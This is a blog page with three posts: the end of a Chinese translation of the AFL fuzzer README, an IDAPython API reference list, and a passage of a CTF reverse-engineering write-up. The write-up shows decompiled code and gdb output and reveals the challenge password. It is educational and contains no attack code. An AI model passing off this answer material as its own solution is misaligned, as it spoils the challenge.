<h3 id="11）崩溃以外"><a href="#11）崩溃以外" class="headerlink" title="11）崩溃以外"></a>11）崩溃以外</h3><p>在发现非崩溃设计和错误实现方面，Fuzzing也是一种很棒但未被充分利用的技术。通过修改目标程序来调用abort()，可以发现很多有趣的错误：</p>
<blockquote>
<ol>
<li>当给定相同的模糊生成的输入时，两个bignum库会产生不同的输出</li>
<li>当要求连续解码相同的输入图像时，图像库产生不同的输出</li>
<li>当迭代序列化和反序列化模糊器提供数据时,序列化/反序列化库无法产生稳定的输出</li>
<li>当要求压缩和解压特定blob时，压缩库生成与输入文件不一致的输出</li>
</ol>
</blockquote>
<p>实现这些或类似的健全检查通常只需要很少的时间;如果你是一个特定包的维护者，你可以使用#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION(libfuzzer也有的标志)或#ifdef __AFL_COMPILER(仅针对AFL)。</p>
<h3 id="12）通有风险"><a href="#12）通有风险" class="headerlink" title="12）通有风险"></a>12）通有风险</h3><p>请记住，与许多其他计算密集型任务类似，模糊测试可能会给硬件和操作系统带来压力。特别是以下几点：</p>
<blockquote>
<ol>
<li>你的CPU会很热，需要适当的冷却。在大多数情况下，如果冷却不足或停止正常工作，CPU速度将自动节流。也就是说，特别是在不太合适的硬件(笔记本电脑、智能手机等)上发出信号时，爆炸也不是完全不可能的；</li>
<li>目标程序最终可能会不规律地攫取千兆字节的内存或用垃圾文件填充磁盘空间。AFL试图加强基本的内存限制，但不能防止每一个可能的事故。底线是您不应该在数据丢失的可能性不是可接受的风险的系统上混淆。</li>
<li>模糊测试涉及对文件系统的数十亿次读取和写入。在现代系统中，这通常会被大量缓存，从而导致适度的物理I/O压力，但是也有很多因素改变这个压力值。因此你应该注意到这个潜在的故障，在物理I/O压力很大的情况下，可能会缩短许多HDD和SDD的寿命。</li>
</ol>
</blockquote>
<p>Linux系统上监视磁盘I/O情况的一个好用的命令是<code>iostat</code>(I/O STATE):</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ iostat -d 3 -x -k [...optional disk ID...]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="13）已知的缺陷和需要改进的地方"><a href="#13）已知的缺陷和需要改进的地方" class="headerlink" title="13）已知的缺陷和需要改进的地方"></a>13）已知的缺陷和需要改进的地方</h3><p>这里有一些对AFL最重要的注意事项：</p>
<blockquote>
<ol>
<li><p>AFL通过检查第一个衍生进程因信号(SIGSEGV, SIGABRT等)而死亡来检测错误。为这些信号安装自定义处理程序的程序可能需要注释掉相关代码。同样，模糊目标产生的子进程中的错误可能会逃避检测，除非您手动添加一些代码来捕获它。</p>
</li>
<li><p>与任何其他暴力工具一样，如果使用加密、校验和、加密签名或压缩来完全包装待测试的实际数据格式，则fuzzer提供有限的覆盖范围。</p>
<p>要解决这个问题，你可以注释掉相关的检查（参阅安装目录下 experimental/libpng_no_checksum/）；如果不行，你也可以写一个后处理器（postprocessor），关于什么是后处理器参阅：experimental/post_library/。</p>
</li>
<li><p>不幸的是，AFL对于ASAN文件和64位二进制文件有一些取舍，这不是因为afl-fuzz的某些特定故障。参阅notes_for_asan.txt。</p>
</li>
<li><p>afl-fuzz并没有提供支持模糊测试的网络服务程序，后台守护程序或需要UI交互才能工作的交互式应用程序。你可以进行简单的代码修改，使其变得更为传统。Preeny也可能提供了一个相对简单的选项，参阅：<a target="_blank" rel="noopener" href="https://github.com/zardus/preeny%E3%80%82">https://github.com/zardus/preeny。</a></p>
<p>修改基于网络的服务的一些有用提示也可以在这里看到：<a target="_blank" rel="noopener" href="https://www.fastly.com/blog/how-to-fuzz-server-american-fuzzy-lop%E3%80%82">https://www.fastly.com/blog/how-to-fuzz-server-american-fuzzy-lop。</a></p>
</li>
<li><p>AFL不输出人类可读的覆盖率数据。如果你想监控覆盖率，请使用Michael Rash的afl-cov：<a target="_blank" rel="noopener" href="https://github.com/mrash/afl-cov%E3%80%82">https://github.com/mrash/afl-cov。</a></p>
</li>
<li><p>有时sentient machines会反抗它们的创造者。（这里我看原文也真看不懂了，sentient machines好像是指专门研究real AI的一个名词）如果发生在你身上，请查看：<a target="_blank" rel="noopener" href="http://lcamtuf.coredump.cx/prep/%E3%80%82">http://lcamtuf.coredump.cx/prep/。</a></p>
</li>
</ol>
</blockquote>
<p>除此之外，请参阅：INSTALL for platform-specific tips.</p>
<h3 id="14）特别鸣谢"><a href="#14）特别鸣谢" class="headerlink" title="14）特别鸣谢"></a>14）特别鸣谢</h3><p>……</p>
<h3 id="15）联系"><a href="#15）联系" class="headerlink" title="15）联系"></a>15）联系</h3><p><a href="mailto:&#108;&#x63;&#97;&#x6d;&#x74;&#x75;&#x66;&#x40;&#103;&#x6f;&#x6f;&#103;&#x6c;&#101;&#x2e;&#x63;&#111;&#109;">&#108;&#x63;&#97;&#x6d;&#x74;&#x75;&#x66;&#x40;&#103;&#x6f;&#x6f;&#103;&#x6c;&#101;&#x2e;&#x63;&#111;&#109;</a><br><a href="mailto:&#97;&#x66;&#x6c;&#x2d;&#117;&#115;&#x65;&#114;&#115;&#43;&#115;&#x75;&#x62;&#x73;&#x63;&#114;&#105;&#x62;&#101;&#x40;&#103;&#111;&#111;&#x67;&#108;&#101;&#103;&#114;&#111;&#117;&#112;&#115;&#x2e;&#99;&#x6f;&#x6d;">&#97;&#x66;&#x6c;&#x2d;&#117;&#115;&#x65;&#114;&#115;&#43;&#115;&#x75;&#x62;&#x73;&#x63;&#114;&#105;&#x62;&#101;&#x40;&#103;&#111;&#111;&#x67;&#108;&#101;&#103;&#114;&#111;&#117;&#112;&#115;&#x2e;&#99;&#x6f;&#x6d;</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Demen Lee">
      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Spwpun's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/" class="post-title-link" itemprop="url">IDAPython常用API整理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-02-15 18:59:52" itemprop="dateCreated datePublished" datetime="2020-02-15T18:59:52+08:00">2020-02-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-04-16 22:20:05" itemprop="dateModified" datetime="2020-04-16T22:20:05+08:00">2020-04-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="IDAPython常用API介绍："><a href="#IDAPython常用API介绍：" class="headerlink" title="IDAPython常用API介绍："></a>IDAPython常用API介绍：</h3><ul>
<li>通过一些脚本和《IDA Pro权威指南》，查阅官网的IDAPython API整理</li>
</ul>
<p>idaapi.MinEA()：获取载入程序的最小的有效地址</p>
<p>idaapi.MaxEA()：获取载入的程序最大的有效地址</p>
<p>idaapi.get_inf_structure()：获取当前打开的IDA的版本的信息，返回的是一个结构体，貌似是idainfo。</p>
<p><img src="/2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/image-20200215165904658.png" alt="image-20200215165904658"></p>
<p>idainfo.is_32bit(), idainfo.is_64bit()：判断IDA是32位的还是64位的，也就是可以通过上面的接口获取再调用，直接<code>import idainfo</code>是没有用的。</p>
<p>idaapi.Assemble(head, line)：从head地址开始反汇编，寻找直到遇到line这条指令时停止，返回两个变量，一个表示是否成功，另外一个是最后这条line指令的字节表示，例如：<code>ret</code>就会是<code>&#39;\xc3&#39;</code>这一个字节来表示，有些指令可能由多个字节表示。</p>
<p>idaapi.GetMnem(addr)：获取addr地址处的指令。</p>
<p>idaapi.MakeCode(addr)：从addr地址开始尝试将数据转换为汇编代码。</p>
<p>idaapi.next_not_tail(addr)：往下走一个指令，如果不是尾部，则返回下一条指令的起始地址。</p>
<p>idaapi.GetDisasm(addr)：获取addr地址开始的一条汇编指令。</p>
<p>idaapi.GetFlags(addr)：获取addr地址处的一系列标志位，可用来判断属于code还是data。</p>
<p>idaapi.isCode(Flags)：通过Flags判断是否是汇编代码。</p>
<p>idaapi.MakeUnkn(addr, size)：取消对addr地址处的size大小的定义，暂不清楚该地址是代码还是数据时可以使用。</p>
<p>idaapi.GetOpnd(addr, index)：取addr地址处的指令的第index个操作数，从零开始，从左开始，依次为intel汇编语法中的目的操作数、源操作数。</p>
<p>idaapi.get_name_ea(min_ea, name)：从min_ea地址开始，寻找名为name的有效地址，该name可以为函数名、label名。</p>
<p>idaapi.get_dword(addr)：从addr地址处获取一个dword数据。</p>
<p>idaapi.MakeDword(addr)：将addr开始的一个DWORD大小的数据定义为双字形式，举一反三，Q代表四字节数据，API形式一致。</p>
<p>idaapi.Segname(addr)：得到addr地址所处的区段名。</p>
<p>idaapi.MakeFunction(addr)：将addr地址处定义为一个函数，相当于快捷键<code>P</code>。</p>
<p>BADADDR: 常量，代表错误的地址。</p>
<p>idaapi.GetSpd(addr)：获取addr地址处的栈指针SP的值，而在IDA中显示的值则是SP到BP基址针的差值，例如获取到的值为<code>-4</code>,在IDA中显示栈指针的情况时则为4。</p>
<p><img src="/2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/image-20200215184320248.png" alt="image-20200215184320248"></p>
<p><img src="/2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/image-20200215184345189.png" alt="image-20200215184345189"></p>
<p>idaapi.SetSpDiff(addr, diff)：设置addr地址处的Sp指针与Bp指针的差值，在平衡堆栈时需要用到。</p>
<p>idaapi.next_head(head, BADADDR)：遍历下一条指令，除非遇到BADADDR，返回下一条指令的地址。</p>
<p>idaapi.ua_mnem(addr)：返回addr地址处的指令类型。</p>
<p>idaapi.MakeName(addr, ‘’)：给addr地址处一个标记label。</p>
<p>FindFuncEnd(ea): ea为函数的起始地址，找到该函数的结尾地址并返回。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Demen Lee">
      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Spwpun's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/" class="post-title-link" itemprop="url">BambooFox-Move or not详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-01-02 20:16:30" itemprop="dateCreated datePublished" datetime="2020-01-02T20:16:30+08:00">2020-01-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-09 18:37:40" itemprop="dateModified" datetime="2020-11-09T18:37:40+08:00">2020-11-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="BambooFox-“Move-or-not”详解"><a href="#BambooFox-“Move-or-not”详解" class="headerlink" title="BambooFox-“Move or not”详解"></a>BambooFox-“Move or not”详解</h3><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>主要想讲讲通过这道题学到的东西，看完这篇文章，你可以：</p>
<ul>
<li>一般逆向题的静态分析技术；</li>
<li>Windows上IDA结合Linux虚拟机远程动态调试技术；</li>
<li>Linux上初级<code>expect</code>编程技术</li>
<li><code>ltrace</code>动态调试技术（更适合这道题）</li>
</ul>
<p>题目描述：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102145536953.png" alt="des"></p>
<h4 id="2-静态分析"><a href="#2-静态分析" class="headerlink" title="2.静态分析"></a>2.静态分析</h4><p>题目给了一个文件<code>pro</code>,使用<code>file</code>命令查看文件格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ file pro</span><br><span class="line">pro: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=7bfce31b622a4e5bd9db43154888a3e1891ccac9, stripped</span><br><span class="line">spwpun@ubuntu:~/Documents/20200102$ </span><br></pre></td></tr></table></figure>

<p>是一个ELF64位文件，在Linux虚拟机下执行该文件，首先需要输入password，随便输入之后验证错误就结束了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ ./pro</span><br><span class="line">First give me your password: 2312</span><br><span class="line">You don<span class="string">&#x27;t know static analysis !</span></span><br><span class="line"><span class="string">spwpun@ubuntu:~/Documents/20200102$ </span></span><br></pre></td></tr></table></figure>

<p>提示需要静态分析，使用IDA64位打开，程序没有混淆，在反编译后的main函数中很容易就能看清楚程序的逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First give me your password: &quot;</span>, a2, a3);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">98416</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t know static analysis !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Second give me your key: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  v4 -= <span class="number">49</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">    *((_BYTE *)&amp;loc_201020 + i) += v4;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *))loc_201020)(s1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Then Verify your flag: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, &amp;s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are right. Congratulations !!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t know dynamic analysis !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总的来说，程序的逻辑如下：</p>
<ol>
<li>首先获取用户输入，验证password</li>
<li>然后继续获取用户输入，验证key</li>
<li>key减去49得到新的key</li>
<li>修改<code>loc_201020</code>处的前11个字节的数据，在原始的数据上加上新的key的值</li>
<li>然后把<code>loc_201020</code>当做函数来执行，参数为<code>s1</code>，应该是修改<code>s1</code>的内容</li>
<li>再次获取用户输入，验证flag值</li>
<li>最后比较输入的flag和s1，相同则验证成功</li>
</ol>
<p>从上面的反编译伪代码中可以很容易知道password的值为<code>98416</code>,  但是<code>key</code>的值却不知道。貌似<code>key</code>是为了解码出正确的函数，然后利用该函数再解码真正的flag：<code>s1</code>，下面我使用动态调试来验证一下。</p>
<h4 id="3-动态调试"><a href="#3-动态调试" class="headerlink" title="3.动态调试"></a>3.动态调试</h4><h5 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h5><p>首先在IDA中查看<code>main</code>函数的地址，下图中为<code>0x00000000000007FA</code>：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102153118458.png" alt="image-20200102153118458"></p>
<p>看上去这个地址是有点奇怪，暂时不管，先用gdb试试。</p>
<p>使用gdb启动该程序，设置断点，然后执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ gdb ./pro</span><br><span class="line">GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from ./pro...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gdb-peda$ b *0x7fa</span><br><span class="line">Breakpoint 1 at 0x7fa</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/spwpun/Documents/20200102/pro </span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint 1.</span><br><span class="line">Cannot access memory at address 0x7fa</span><br><span class="line"></span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure>

<p>上面的代码中提示不能设置断点，因为内存地址不可用。原来是地址随机化保护，以为是逆向题就没在意这个，使用<code>checksec</code>命令查看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec pro</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : disabled</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : FULL</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure>

<p>果然开启了PIE。不设断点，直接执行，输入password和key之后，程序会报段错误：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/spwpun/Documents/20200102/pro </span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: 31</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x0 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x70 (<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">RDX: 0x555555755020 --&gt; 0x6deeb47035141c6d </span><br><span class="line">RSI: 0x1 </span><br><span class="line">RDI: 0x555555755100 (<span class="string">&quot;iAxU.|&amp;30\f) (Heh2G:bdyRF;\nOYn=l%&quot;</span>)</span><br><span class="line">RBP: 0x7fffffffdd50 --&gt; 0x555555554960 (push   r15)</span><br><span class="line">RSP: 0x7fffffffdd08 --&gt; 0x5555555548e2 (lea    rdi,[rip+0x162]        <span class="comment"># 0x555555554a4b)</span></span><br><span class="line">RIP: 0x555555755020 --&gt; 0x6deeb47035141c6d </span><br><span class="line">R8 : 0x0 </span><br><span class="line">R9 : 0x0 </span><br><span class="line">R10: 0x7ffff7b82cc0 --&gt; 0x2000200020002 </span><br><span class="line">R11: 0x555555554a08 --&gt; 0x0 </span><br><span class="line">R12: 0x5555555546f0 (xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffde30 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x55555575501a:	add    BYTE PTR [rax],al</span><br><span class="line">   0x55555575501c:	add    BYTE PTR [rax],al</span><br><span class="line">   0x55555575501e:	add    BYTE PTR [rax],al</span><br><span class="line">=&gt; 0x555555755020:	ins    DWORD PTR es:[rdi],dx</span><br><span class="line">   0x555555755021:	sbb    al,0x14</span><br><span class="line">   0x555555755023:	xor    eax,0x6deeb470</span><br><span class="line">   0x555555755028:	hlt    </span><br><span class="line">   0x555555755029:	or     eax,0x1c77035</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdd08 --&gt; 0x5555555548e2 (lea    rdi,[rip+0x162]        <span class="comment"># 0x555555554a4b)</span></span><br><span class="line">0008| 0x7fffffffdd10 --&gt; 0x1 </span><br><span class="line">0016| 0x7fffffffdd18 --&gt; 0xcffffffee </span><br><span class="line">0024| 0x7fffffffdd20 --&gt; 0x7ffff7de59a0 (&lt;_dl_fini&gt;:	push   rbp)</span><br><span class="line">0032| 0x7fffffffdd28 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdd30 --&gt; 0x555555554960 (push   r15)</span><br><span class="line">0048| 0x7fffffffdd38 --&gt; 0x5555555546f0 (xor    ebp,ebp)</span><br><span class="line">0056| 0x7fffffffdd40 --&gt; 0x7fffffffde30 --&gt; 0x1 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x0000555555755020 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure>

<p>且根据gdb的<code>gdb-peda</code>插件，可以看到，执行的地址(<code>0x0000555555755020</code>)确实和IDA中显示的不一样，不过有一个地方需要注意，地址的后3位数是一样的。</p>
<p>gdb我现在用得还不是太熟，还是习惯OD之类的图形化调试工具，知道IDA有一个功能可以远程调试Linux上的程序，之前也没试过，就趁这次学习记录一下吧。</p>
<h5 id="IDA远程调试Linux程序"><a href="#IDA远程调试Linux程序" class="headerlink" title="IDA远程调试Linux程序"></a>IDA远程调试Linux程序</h5><p>首先将Windows上IDA安装目录下的调试程序复制到虚拟机中：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102160016312.png" alt="image-20200102160016312"></p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102160212026.png" alt="image-20200102160212026"></p>
<p>查看Linux虚拟机的IP，并运行该程序：</p>
